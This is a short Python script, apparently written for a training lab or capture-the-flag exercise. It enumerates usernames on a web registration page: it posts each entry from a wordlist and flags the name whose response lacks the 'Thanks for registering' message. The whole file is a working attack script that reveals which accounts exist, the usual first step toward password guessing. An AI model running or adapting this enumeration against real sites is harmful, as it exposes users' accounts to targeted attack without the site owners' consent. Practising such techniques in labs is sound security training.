import requests 
import re  

url = "http://46.101.60.26:31068/question4/register.php"

session = requests.Session()
with open("top-usernames-shortlist.txt", "r") as f:
	wordlist = f.readlines()

for word in wordlist:
	word = word.rstrip()
	data = {
		"userid": word,
		"email": "test+test@test.com",
		"passwd1": "abc",
		"passwd2": "abc",
		"submit": "submit"
	}

	r = session.post(url, data=data)
	m = re.search(r"Thanks for registering", r.text)
	if m == None:
		print("========================")
		print(f"[!] The username is {word}")
		print("========================")
		break
	else:
		print(f"[x] testing {word}")
# print(r.text)